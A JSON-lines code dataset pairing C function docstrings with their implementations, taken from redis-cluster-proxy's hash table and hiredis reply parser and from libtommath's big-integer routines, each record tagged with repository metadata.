{"docstring": "/* Finds the dictEntry reference by using pointer and pre-calculated hash.\n * oldkey is a dead pointer and should not be accessed.\n * the hash value should be provided using dictGetHash.\n * no string / key comparison is performed.\n * return value is the reference to the dictEntry if found, or NULL if not found. */\n", "func_signal": "dictEntry **dictFindEntryRefByPtrAndHash(dict *d, const void *oldptr, uint64_t hash)", "code": "{\n    dictEntry *he, **heref;\n    unsigned long idx, table;\n\n    if (d->ht[0].used + d->ht[1].used == 0) return NULL; /* dict is empty */\n    for (table = 0; table <= 1; table++) {\n        idx = hash & d->ht[table].sizemask;\n        heref = &d->ht[table].table[idx];\n        he = *heref;\n        while(he) {\n            if (oldptr==he->key)\n                return heref;\n            heref = &he->next;\n            he = *heref;\n        }\n        if (!dictIsRehashing(d)) return NULL;\n    }\n    return NULL;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Rehash for an amount of time between ms milliseconds and ms+1 milliseconds */\n", "func_signal": "int dictRehashMilliseconds(dict *d, int ms)", "code": "{\n    long long start = timeInMilliseconds();\n    int rehashes = 0;\n\n    while(dictRehash(d,100)) {\n        rehashes += 100;\n        if (timeInMilliseconds()-start > ms) break;\n    }\n    return rehashes;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Return a random entry from the hash table. Useful to\n * implement randomized algorithms */\n", "func_signal": "dictEntry *dictGetRandomKey(dict *d)", "code": "{\n    dictEntry *he, *orighe;\n    unsigned long h;\n    int listlen, listele;\n\n    if (dictSize(d) == 0) return NULL;\n    if (dictIsRehashing(d)) _dictRehashStep(d);\n    if (dictIsRehashing(d)) {\n        do {\n            /* We are sure there are no elements in indexes from 0\n             * to rehashidx-1 */\n            h = d->rehashidx + (random() % (d->ht[0].size +\n                                            d->ht[1].size -\n                                            d->rehashidx));\n            he = (h >= d->ht[0].size) ? d->ht[1].table[h - d->ht[0].size] :\n                                      d->ht[0].table[h];\n        } while(he == NULL);\n    } else {\n        do {\n            h = random() & d->ht[0].sizemask;\n            he = d->ht[0].table[h];\n        } while(he == NULL);\n    }\n\n    /* Now we found a non empty bucket, but it is a linked\n     * list and we need to get a random element from the list.\n     * The only sane way to do so is counting the elements and\n     * select a random index. */\n    listlen = 0;\n    orighe = he;\n    while(he) {\n        he = he->next;\n        listlen++;\n    }\n    listele = random() % listlen;\n    he = orighe;\n    while(listele--) he = he->next;\n    return he;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Expand the hash table if needed */\n", "func_signal": "static int _dictExpandIfNeeded(dict *d)", "code": "{\n    /* Incremental rehashing already in progress. Return. */\n    if (dictIsRehashing(d)) return DICT_OK;\n\n    /* If the hash table is empty expand it to the initial size. */\n    if (d->ht[0].size == 0) return dictExpand(d, DICT_HT_INITIAL_SIZE);\n\n    /* If we reached the 1:1 ratio, and we are allowed to resize the hash\n     * table (global setting) or we should avoid it but the ratio between\n     * elements/buckets is over the \"safe\" threshold, we resize doubling\n     * the number of buckets. */\n    if (d->ht[0].used >= d->ht[0].size &&\n        (dict_can_resize ||\n         d->ht[0].used/d->ht[0].size > dict_force_resize_ratio))\n    {\n        return dictExpand(d, d->ht[0].used*2);\n    }\n    return DICT_OK;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Low level add or find:\n * This function adds the entry but instead of setting a value returns the\n * dictEntry structure to the user, that will make sure to fill the value\n * field as he wishes.\n *\n * This function is also directly exposed to the user API to be called\n * mainly in order to store non-pointers inside the hash value, example:\n *\n * entry = dictAddRaw(dict,mykey,NULL);\n * if (entry != NULL) dictSetSignedIntegerVal(entry,1000);\n *\n * Return values:\n *\n * If key already exists NULL is returned, and \"*existing\" is populated\n * with the existing entry if existing is not NULL.\n *\n * If key was added, the hash entry is returned to be manipulated by the caller.\n */\n", "func_signal": "dictEntry *dictAddRaw(dict *d, void *key, dictEntry **existing)", "code": "{\n    long index;\n    dictEntry *entry;\n    dictht *ht;\n\n    if (dictIsRehashing(d)) _dictRehashStep(d);\n\n    /* Get the index of the new element, or -1 if\n     * the element already exists. */\n    if ((index = _dictKeyIndex(d, key, dictHashKey(d,key), existing)) == -1)\n        return NULL;\n\n    /* Allocate the memory and store the new entry.\n     * Insert the element in top, with the assumption that in a database\n     * system it is more likely that recently added entries are accessed\n     * more frequently. */\n    ht = dictIsRehashing(d) ? &d->ht[1] : &d->ht[0];\n    entry = zmalloc(sizeof(*entry));\n    entry->next = ht->table[index];\n    ht->table[index] = entry;\n    ht->used++;\n\n    /* Set the hash entry fields. */\n    dictSetKey(d, entry, key);\n    return entry;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Search and remove an element. This is an helper function for\n * dictDelete() and dictUnlink(), please check the top comment\n * of those functions. */\n", "func_signal": "static dictEntry *dictGenericDelete(dict *d, const void *key, int nofree)", "code": "{\n    uint64_t h, idx;\n    dictEntry *he, *prevHe;\n    int table;\n\n    if (d->ht[0].used == 0 && d->ht[1].used == 0) return NULL;\n\n    if (dictIsRehashing(d)) _dictRehashStep(d);\n    h = dictHashKey(d, key);\n\n    for (table = 0; table <= 1; table++) {\n        idx = h & d->ht[table].sizemask;\n        he = d->ht[table].table[idx];\n        prevHe = NULL;\n        while(he) {\n            if (key==he->key || dictCompareKeys(d, key, he->key)) {\n                /* Unlink the element from the list */\n                if (prevHe)\n                    prevHe->next = he->next;\n                else\n                    d->ht[table].table[idx] = he->next;\n                if (!nofree) {\n                    dictFreeKey(d, he);\n                    dictFreeVal(d, he);\n                    zfree(he);\n                }\n                d->ht[table].used--;\n                return he;\n            }\n            prevHe = he;\n            he = he->next;\n        }\n        if (!dictIsRehashing(d)) break;\n    }\n    return NULL; /* not found */\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* A fingerprint is a 64 bit number that represents the state of the dictionary\n * at a given time, it's just a few dict properties xored together.\n * When an unsafe iterator is initialized, we get the dict fingerprint, and check\n * the fingerprint again when the iterator is released.\n * If the two fingerprints are different it means that the user of the iterator\n * performed forbidden operations against the dictionary while iterating. */\n", "func_signal": "long long dictFingerprint(dict *d)", "code": "{\n    long long integers[6], hash = 0;\n    int j;\n\n    integers[0] = (long) d->ht[0].table;\n    integers[1] = d->ht[0].size;\n    integers[2] = d->ht[0].used;\n    integers[3] = (long) d->ht[1].table;\n    integers[4] = d->ht[1].size;\n    integers[5] = d->ht[1].used;\n\n    /* We hash N integers by summing every successive integer with the integer\n     * hashing of the previous sum. Basically:\n     *\n     * Result = hash(hash(hash(int1)+int2)+int3) ...\n     *\n     * This way the same set of integers in a different order will (likely) hash\n     * to a different number. */\n    for (j = 0; j < 6; j++) {\n        hash += integers[j];\n        /* For the hashing step we use Tomas Wang's 64 bit integer hash. */\n        hash = (~hash) + (hash << 21); // hash = (hash << 21) - hash - 1;\n        hash = hash ^ (hash >> 24);\n        hash = (hash + (hash << 3)) + (hash << 8); // hash * 265\n        hash = hash ^ (hash >> 14);\n        hash = (hash + (hash << 2)) + (hash << 4); // hash * 21\n        hash = hash ^ (hash >> 28);\n        hash = hash + (hash << 31);\n    }\n    return hash;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Expand or create the hash table */\n", "func_signal": "int dictExpand(dict *d, unsigned long size)", "code": "{\n    /* the size is invalid if it is smaller than the number of\n     * elements already inside the hash table */\n    if (dictIsRehashing(d) || d->ht[0].used > size)\n        return DICT_ERR;\n\n    dictht n; /* the new hash table */\n    unsigned long realsize = _dictNextPower(size);\n\n    /* Rehashing to the same table size is not useful. */\n    if (realsize == d->ht[0].size) return DICT_ERR;\n\n    /* Allocate the new hash table and initialize all pointers to NULL */\n    n.size = realsize;\n    n.sizemask = realsize-1;\n    n.table = zcalloc(realsize*sizeof(dictEntry*));\n    n.used = 0;\n\n    /* Is this the first initialization? If so it's not really a rehashing\n     * we just set the first hash table so that it can accept keys. */\n    if (d->ht[0].table == NULL) {\n        d->ht[0] = n;\n        return DICT_OK;\n    }\n\n    /* Prepare a second hash table for incremental rehashing */\n    d->ht[1] = n;\n    d->rehashidx = 0;\n    return DICT_OK;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Initialize the hash table */\n", "func_signal": "int _dictInit(dict *d, dictType *type,\n        void *privDataPtr)", "code": "{\n    _dictReset(&d->ht[0]);\n    _dictReset(&d->ht[1]);\n    d->type = type;\n    d->privdata = privDataPtr;\n    d->rehashidx = -1;\n    d->iterators = 0;\n    return DICT_OK;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Reset a hash table already initialized with ht_init().\n * NOTE: This function should only be called by ht_destroy(). */\n", "func_signal": "static void _dictReset(dictht *ht)", "code": "{\n    ht->table = NULL;\n    ht->size = 0;\n    ht->sizemask = 0;\n    ht->used = 0;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Resize the table to the minimal size that contains all the elements,\n * but with the invariant of a USED/BUCKETS ratio near to <= 1 */\n", "func_signal": "int dictResize(dict *d)", "code": "{\n    int minimal;\n\n    if (!dict_can_resize || dictIsRehashing(d)) return DICT_ERR;\n    minimal = d->ht[0].used;\n    if (minimal < DICT_HT_INITIAL_SIZE)\n        minimal = DICT_HT_INITIAL_SIZE;\n    return dictExpand(d, minimal);\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Performs N steps of incremental rehashing. Returns 1 if there are still\n * keys to move from the old to the new hash table, otherwise 0 is returned.\n *\n * Note that a rehashing step consists in moving a bucket (that may have more\n * than one key as we use chaining) from the old to the new hash table, however\n * since part of the hash table may be composed of empty spaces, it is not\n * guaranteed that this function will rehash even a single bucket, since it\n * will visit at max N*10 empty buckets in total, otherwise the amount of\n * work it does would be unbound and the function may block for a long time. */\n", "func_signal": "int dictRehash(dict *d, int n)", "code": "{\n    int empty_visits = n*10; /* Max number of empty buckets to visit. */\n    if (!dictIsRehashing(d)) return 0;\n\n    while(n-- && d->ht[0].used != 0) {\n        dictEntry *de, *nextde;\n\n        /* Note that rehashidx can't overflow as we are sure there are more\n         * elements because ht[0].used != 0 */\n        assert(d->ht[0].size > (unsigned long)d->rehashidx);\n        while(d->ht[0].table[d->rehashidx] == NULL) {\n            d->rehashidx++;\n            if (--empty_visits == 0) return 1;\n        }\n        de = d->ht[0].table[d->rehashidx];\n        /* Move all the keys in this bucket from the old to the new hash HT */\n        while(de) {\n            uint64_t h;\n\n            nextde = de->next;\n            /* Get the index in the new hash table */\n            h = dictHashKey(d, de->key) & d->ht[1].sizemask;\n            de->next = d->ht[1].table[h];\n            d->ht[1].table[h] = de;\n            d->ht[0].used--;\n            d->ht[1].used++;\n            de = nextde;\n        }\n        d->ht[0].table[d->rehashidx] = NULL;\n        d->rehashidx++;\n    }\n\n    /* Check if we already rehashed the whole table... */\n    if (d->ht[0].used == 0) {\n        zfree(d->ht[0].table);\n        d->ht[0] = d->ht[1];\n        _dictReset(&d->ht[1]);\n        d->rehashidx = -1;\n        return 0;\n    }\n\n    /* More to rehash... */\n    return 1;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Process the array, map and set types. */\n", "func_signal": "static int processAggregateItem(redisReader *r)", "code": "{\n    redisReadTask *cur = &(r->rstack[r->ridx]);\n    void *obj;\n    char *p;\n    long long elements;\n    int root = 0, len;\n\n    /* Set error for nested multi bulks with depth > 7 */\n    if (r->ridx == 8) {\n        __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n            \"No support for nested multi bulk replies with depth > 7\");\n        return REDIS_ERR;\n    }\n\n    if ((p = readLine(r,&len)) != NULL) {\n        if (string2ll(p, len, &elements) == REDIS_ERR) {\n            __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n                    \"Bad multi-bulk length\");\n            return REDIS_ERR;\n        }\n\n        root = (r->ridx == 0);\n\n        if (elements < -1 || elements > INT_MAX) {\n            __redisReaderSetError(r,REDIS_ERR_PROTOCOL,\n                    \"Multi-bulk length out of range\");\n            return REDIS_ERR;\n        }\n\n        if (elements == -1) {\n            if (r->fn && r->fn->createNil)\n                obj = r->fn->createNil(cur);\n            else\n                obj = (void*)REDIS_REPLY_NIL;\n\n            if (obj == NULL) {\n                __redisReaderSetErrorOOM(r);\n                return REDIS_ERR;\n            }\n\n            moveToNextTask(r);\n        } else {\n            if (cur->type == REDIS_REPLY_MAP) elements *= 2;\n\n            if (r->fn && r->fn->createArray)\n                obj = r->fn->createArray(cur,elements);\n            else\n                obj = (void*)(long)cur->type;\n\n            if (obj == NULL) {\n                __redisReaderSetErrorOOM(r);\n                return REDIS_ERR;\n            }\n\n            /* Modify task stack when there are more than 0 elements. */\n            if (elements > 0) {\n                cur->elements = elements;\n                cur->obj = obj;\n                r->ridx++;\n                r->rstack[r->ridx].type = -1;\n                r->rstack[r->ridx].elements = -1;\n                r->rstack[r->ridx].idx = 0;\n                r->rstack[r->ridx].obj = NULL;\n                r->rstack[r->ridx].parent = cur;\n                r->rstack[r->ridx].privdata = r->privdata;\n            } else {\n                moveToNextTask(r);\n            }\n        }\n\n        /* Set reply if this is the root object. */\n        if (root) r->reply = obj;\n        return REDIS_OK;\n    }\n\n    return REDIS_ERR;\n}", "path": "redis-cluster-proxy/deps/hiredis/read.c", "commit_date": "2020-02-06 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Find pointer to \\r\\n. */\n", "func_signal": "static char *seekNewline(char *s, size_t len)", "code": "{\n    int pos = 0;\n    int _len = len-1;\n\n    /* Position should be < len-1 because the character at \"pos\" should be\n     * followed by a \\n. Note that strchr cannot be used because it doesn't\n     * allow to search a limited length and the buffer that is being searched\n     * might not have a trailing NULL character. */\n    while (pos < _len) {\n        while(pos < _len && s[pos] != '\\r') pos++;\n        if (pos==_len) {\n            /* Not found. */\n            return NULL;\n        } else {\n            if (s[pos+1] == '\\n') {\n                /* Found. */\n                return s+pos;\n            } else {\n                /* Continue searching. */\n                pos++;\n            }\n        }\n    }\n    return NULL;\n}", "path": "redis-cluster-proxy/deps/hiredis/read.c", "commit_date": "2020-02-06 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Add or Find:\n * dictAddOrFind() is simply a version of dictAddRaw() that always\n * returns the hash entry of the specified key, even if the key already\n * exists and can't be added (in that case the entry of the already\n * existing key is returned.)\n *\n * See dictAddRaw() for more information. */\n", "func_signal": "dictEntry *dictAddOrFind(dict *d, void *key)", "code": "{\n    dictEntry *entry, *existing;\n    entry = dictAddRaw(d,key,&existing);\n    return entry ? entry : existing;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Our hash table capability is a power of two */\n", "func_signal": "static unsigned long _dictNextPower(unsigned long size)", "code": "{\n    unsigned long i = DICT_HT_INITIAL_SIZE;\n\n    if (size >= LONG_MAX) return LONG_MAX + 1LU;\n    while(1) {\n        if (i >= size)\n            return i;\n        i *= 2;\n    }\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Clear & Release the hash table */\n", "func_signal": "void dictRelease(dict *d)", "code": "{\n    _dictClear(d,&d->ht[0],NULL);\n    _dictClear(d,&d->ht[1],NULL);\n    zfree(d);\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Convert a string into a long long. Returns REDIS_OK if the string could be\n * parsed into a (non-overflowing) long long, REDIS_ERR otherwise. The value\n * will be set to the parsed value when appropriate.\n *\n * Note that this function demands that the string strictly represents\n * a long long: no spaces or other characters before or after the string\n * representing the number are accepted, nor zeroes at the start if not\n * for the string \"0\" representing the zero number.\n *\n * Because of its strictness, it is safe to use this function to check if\n * you can convert a string into a long long, and obtain back the string\n * from the number without any loss in the string representation. */\n", "func_signal": "static int string2ll(const char *s, size_t slen, long long *value)", "code": "{\n    const char *p = s;\n    size_t plen = 0;\n    int negative = 0;\n    unsigned long long v;\n\n    if (plen == slen)\n        return REDIS_ERR;\n\n    /* Special case: first and only digit is 0. */\n    if (slen == 1 && p[0] == '0') {\n        if (value != NULL) *value = 0;\n        return REDIS_OK;\n    }\n\n    if (p[0] == '-') {\n        negative = 1;\n        p++; plen++;\n\n        /* Abort on only a negative sign. */\n        if (plen == slen)\n            return REDIS_ERR;\n    }\n\n    /* First digit should be 1-9, otherwise the string should just be 0. */\n    if (p[0] >= '1' && p[0] <= '9') {\n        v = p[0]-'0';\n        p++; plen++;\n    } else if (p[0] == '0' && slen == 1) {\n        *value = 0;\n        return REDIS_OK;\n    } else {\n        return REDIS_ERR;\n    }\n\n    while (plen < slen && p[0] >= '0' && p[0] <= '9') {\n        if (v > (ULLONG_MAX / 10)) /* Overflow. */\n            return REDIS_ERR;\n        v *= 10;\n\n        if (v > (ULLONG_MAX - (p[0]-'0'))) /* Overflow. */\n            return REDIS_ERR;\n        v += p[0]-'0';\n\n        p++; plen++;\n    }\n\n    /* Return if not all bytes were used. */\n    if (plen < slen)\n        return REDIS_ERR;\n\n    if (negative) {\n        if (v > ((unsigned long long)(-(LLONG_MIN+1))+1)) /* Overflow. */\n            return REDIS_ERR;\n        if (value != NULL) *value = -v;\n    } else {\n        if (v > LLONG_MAX) /* Overflow. */\n            return REDIS_ERR;\n        if (value != NULL) *value = v;\n    }\n    return REDIS_OK;\n}", "path": "redis-cluster-proxy/deps/hiredis/read.c", "commit_date": "2020-02-06 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* Create a new hash table */\n", "func_signal": "dict *dictCreate(dictType *type,\n        void *privDataPtr)", "code": "{\n    dict *d = zmalloc(sizeof(*d));\n\n    _dictInit(d,type,privDataPtr);\n    return d;\n}", "path": "redis-cluster-proxy/src/dict.c", "commit_date": "2019-03-29 00:00:00", "repo_name": "RedisLabs/redis-cluster-proxy", "stars": 974, "license": "agpl-3.0", "language": "c", "size": 1433}
{"docstring": "/* hac 14.61, pp608 */\n", "func_signal": "mp_err s_mp_invmod(const mp_int *a, const mp_int *b, mp_int *c)", "code": "{\n   mp_int  x, y, u, v, A, B, C, D;\n   mp_err  err;\n\n   /* b cannot be negative */\n   if ((b->sign == MP_NEG) || mp_iszero(b)) {\n      return MP_VAL;\n   }\n\n   /* init temps */\n   if ((err = mp_init_multi(&x, &y, &u, &v,\n                            &A, &B, &C, &D, NULL)) != MP_OKAY) {\n      return err;\n   }\n\n   /* x = a, y = b */\n   if ((err = mp_mod(a, b, &x)) != MP_OKAY)                       goto LBL_ERR;\n   if ((err = mp_copy(b, &y)) != MP_OKAY)                         goto LBL_ERR;\n\n   /* 2. [modified] if x,y are both even then return an error! */\n   if (mp_iseven(&x) && mp_iseven(&y)) {\n      err = MP_VAL;\n      goto LBL_ERR;\n   }\n\n   /* 3. u=x, v=y, A=1, B=0, C=0,D=1 */\n   if ((err = mp_copy(&x, &u)) != MP_OKAY)                        goto LBL_ERR;\n   if ((err = mp_copy(&y, &v)) != MP_OKAY)                        goto LBL_ERR;\n   mp_set(&A, 1uL);\n   mp_set(&D, 1uL);\n\n   do {\n      /* 4.  while u is even do */\n      while (mp_iseven(&u)) {\n         /* 4.1 u = u/2 */\n         if ((err = mp_div_2(&u, &u)) != MP_OKAY)                    goto LBL_ERR;\n\n         /* 4.2 if A or B is odd then */\n         if (mp_isodd(&A) || mp_isodd(&B)) {\n            /* A = (A+y)/2, B = (B-x)/2 */\n            if ((err = mp_add(&A, &y, &A)) != MP_OKAY)               goto LBL_ERR;\n            if ((err = mp_sub(&B, &x, &B)) != MP_OKAY)               goto LBL_ERR;\n         }\n         /* A = A/2, B = B/2 */\n         if ((err = mp_div_2(&A, &A)) != MP_OKAY)                    goto LBL_ERR;\n         if ((err = mp_div_2(&B, &B)) != MP_OKAY)                    goto LBL_ERR;\n      }\n\n      /* 5.  while v is even do */\n      while (mp_iseven(&v)) {\n         /* 5.1 v = v/2 */\n         if ((err = mp_div_2(&v, &v)) != MP_OKAY)                    goto LBL_ERR;\n\n         /* 5.2 if C or D is odd then */\n         if (mp_isodd(&C) || mp_isodd(&D)) {\n            /* C = (C+y)/2, D = (D-x)/2 */\n            if ((err = mp_add(&C, &y, &C)) != MP_OKAY)               goto LBL_ERR;\n            if ((err = mp_sub(&D, &x, &D)) != MP_OKAY)               goto LBL_ERR;\n         }\n         /* C = C/2, D = D/2 */\n         if ((err = mp_div_2(&C, &C)) != MP_OKAY)                    goto LBL_ERR;\n         if ((err = mp_div_2(&D, &D)) != MP_OKAY)                    goto LBL_ERR;\n      }\n\n      /* 6.  if u >= v then */\n      if (mp_cmp(&u, &v) != MP_LT) {\n         /* u = u - v, A = A - C, B = B - D */\n         if ((err = mp_sub(&u, &v, &u)) != MP_OKAY)                  goto LBL_ERR;\n\n         if ((err = mp_sub(&A, &C, &A)) != MP_OKAY)                  goto LBL_ERR;\n\n         if ((err = mp_sub(&B, &D, &B)) != MP_OKAY)                  goto LBL_ERR;\n      } else {\n         /* v - v - u, C = C - A, D = D - B */\n         if ((err = mp_sub(&v, &u, &v)) != MP_OKAY)                  goto LBL_ERR;\n\n         if ((err = mp_sub(&C, &A, &C)) != MP_OKAY)                  goto LBL_ERR;\n\n         if ((err = mp_sub(&D, &B, &D)) != MP_OKAY)                  goto LBL_ERR;\n      }\n\n      /* if not zero goto step 4 */\n   } while (!mp_iszero(&u));\n\n   /* now a = C, b = D, gcd == g*v */\n\n   /* if v != 1 then there is no inverse */\n   if (mp_cmp_d(&v, 1uL) != MP_EQ) {\n      err = MP_VAL;\n      goto LBL_ERR;\n   }\n\n   /* if its too low */\n   while (mp_cmp_d(&C, 0uL) == MP_LT) {\n      if ((err = mp_add(&C, b, &C)) != MP_OKAY)                   goto LBL_ERR;\n   }\n\n   /* too big */\n   while (mp_cmp_mag(&C, b) != MP_LT) {\n      if ((err = mp_sub(&C, b, &C)) != MP_OKAY)                   goto LBL_ERR;\n   }\n\n   /* C is now the inverse */\n   mp_exch(&C, c);\n\nLBL_ERR:\n   mp_clear_multi(&x, &y, &u, &v, &A, &B, &C, &D, NULL);\n   return err;\n}", "path": "libtommath/s_mp_invmod.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* two complement or */\n", "func_signal": "mp_err mp_or(const mp_int *a, const mp_int *b, mp_int *c)", "code": "{\n   int used = MP_MAX(a->used, b->used) + 1, i;\n   mp_err err;\n   mp_digit ac = 1, bc = 1, cc = 1;\n   bool neg = (mp_isneg(a) || mp_isneg(b));\n\n   if ((err = mp_grow(c, used)) != MP_OKAY) {\n      return err;\n   }\n\n   for (i = 0; i < used; i++) {\n      mp_digit x, y;\n\n      /* convert to two complement if negative */\n      if (mp_isneg(a)) {\n         ac += (i >= a->used) ? MP_MASK : (~a->dp[i] & MP_MASK);\n         x = ac & MP_MASK;\n         ac >>= MP_DIGIT_BIT;\n      } else {\n         x = (i >= a->used) ? 0uL : a->dp[i];\n      }\n\n      /* convert to two complement if negative */\n      if (mp_isneg(b)) {\n         bc += (i >= b->used) ? MP_MASK : (~b->dp[i] & MP_MASK);\n         y = bc & MP_MASK;\n         bc >>= MP_DIGIT_BIT;\n      } else {\n         y = (i >= b->used) ? 0uL : b->dp[i];\n      }\n\n      c->dp[i] = x | y;\n\n      /* convert to to sign-magnitude if negative */\n      if (neg) {\n         cc += ~c->dp[i] & MP_MASK;\n         c->dp[i] = cc & MP_MASK;\n         cc >>= MP_DIGIT_BIT;\n      }\n   }\n\n   c->used = used;\n   c->sign = (neg ? MP_NEG : MP_ZPOS);\n   mp_clamp(c);\n   return MP_OKAY;\n}", "path": "libtommath/mp_or.c", "commit_date": "2019-11-11 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
{"docstring": "/* This is possibly the mother of all prime generation functions, muahahahahaha! */\n", "func_signal": "mp_err mp_prime_rand(mp_int *a, int t, int size, int flags)", "code": "{\n   uint8_t *tmp, maskAND, maskOR_msb, maskOR_lsb;\n   int bsize, maskOR_msb_offset;\n   bool res;\n   mp_err err;\n\n   /* sanity check the input */\n   if ((size <= 1) || (t <= 0)) {\n      return MP_VAL;\n   }\n\n   /* MP_PRIME_SAFE implies MP_PRIME_BBS */\n   if ((flags & MP_PRIME_SAFE) != 0) {\n      flags |= MP_PRIME_BBS;\n   }\n\n   /* calc the byte size */\n   bsize = (size>>3) + ((size&7)?1:0);\n\n   /* we need a buffer of bsize bytes */\n   tmp = (uint8_t *) MP_MALLOC((size_t)bsize);\n   if (tmp == NULL) {\n      return MP_MEM;\n   }\n\n   /* calc the maskAND value for the MSbyte*/\n   maskAND = ((size&7) == 0) ? 0xFFu : (uint8_t)(0xFFu >> (8 - (size & 7)));\n\n   /* calc the maskOR_msb */\n   maskOR_msb        = 0;\n   maskOR_msb_offset = ((size & 7) == 1) ? 1 : 0;\n   if ((flags & MP_PRIME_2MSB_ON) != 0) {\n      maskOR_msb       |= (uint8_t)(0x80 >> ((9 - size) & 7));\n   }\n\n   /* get the maskOR_lsb */\n   maskOR_lsb         = 1u;\n   if ((flags & MP_PRIME_BBS) != 0) {\n      maskOR_lsb     |= 3u;\n   }\n\n   do {\n      /* read the bytes */\n      if ((err = s_mp_rand_source(tmp, (size_t)bsize)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n\n      /* work over the MSbyte */\n      tmp[0]    &= maskAND;\n      tmp[0]    |= (uint8_t)(1 << ((size - 1) & 7));\n\n      /* mix in the maskORs */\n      tmp[maskOR_msb_offset]   |= maskOR_msb;\n      tmp[bsize-1]             |= maskOR_lsb;\n\n      /* read it in */\n      /* TODO: casting only for now until all lengths have been changed to the type \"size_t\"*/\n      if ((err = mp_from_ubin(a, tmp, (size_t)bsize)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n\n      /* is it prime? */\n      if ((err = mp_prime_is_prime(a, t, &res)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n      if (!res) {\n         continue;\n      }\n\n      if ((flags & MP_PRIME_SAFE) != 0) {\n         /* see if (a-1)/2 is prime */\n         if ((err = mp_sub_d(a, 1uL, a)) != MP_OKAY) {\n            goto LBL_ERR;\n         }\n         if ((err = mp_div_2(a, a)) != MP_OKAY) {\n            goto LBL_ERR;\n         }\n\n         /* is it prime? */\n         if ((err = mp_prime_is_prime(a, t, &res)) != MP_OKAY) {\n            goto LBL_ERR;\n         }\n      }\n   } while (!res);\n\n   if ((flags & MP_PRIME_SAFE) != 0) {\n      /* restore a to the original value */\n      if ((err = mp_mul_2(a, a)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n      if ((err = mp_add_d(a, 1uL, a)) != MP_OKAY) {\n         goto LBL_ERR;\n      }\n   }\n\n   err = MP_OKAY;\nLBL_ERR:\n   MP_FREE_BUF(tmp, (size_t)bsize);\n   return err;\n}", "path": "libtommath/mp_prime_rand.c", "commit_date": "2019-11-04 00:00:00", "repo_name": "libtom/libtommath", "stars": 622, "license": "other", "language": "c", "size": 21608}
